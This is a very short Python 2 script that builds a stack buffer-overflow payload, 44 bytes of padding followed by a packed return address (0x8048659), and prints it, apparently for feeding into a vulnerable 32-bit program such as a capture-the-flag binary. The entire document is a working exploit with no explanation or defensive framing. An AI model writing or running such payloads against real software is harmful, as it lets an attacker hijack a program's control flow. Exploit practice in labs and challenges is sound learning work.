#!/usr/bin/python

import struct

rop = "A"*44
rop += struct.pack('<I', 0x8048659)

print rop
